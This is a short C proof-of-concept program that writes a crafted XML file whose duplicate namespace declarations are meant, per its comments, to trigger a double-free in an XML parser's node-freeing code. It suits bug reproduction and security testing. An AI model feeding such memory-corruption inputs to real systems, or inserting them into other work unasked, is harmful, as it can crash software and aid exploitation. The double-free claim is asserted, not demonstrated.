#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Crafted XML to trigger bad_free in xmlFreeNode() via xmlSAX2StartElementNs */
    /* Duplicate namespace declarations on the same element cause the parser */
    /* to process overlapping namespace definitions, leading to a double-free */
    
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<root xmlns:p=\"http://a\" xmlns:p=\"http://b\">");
    fprintf(f, "<child xmlns:q=\"http://c\" xmlns:q=\"http://d\"/>");
    fprintf(f, "</root>");

    fclose(f);
    return 0;
}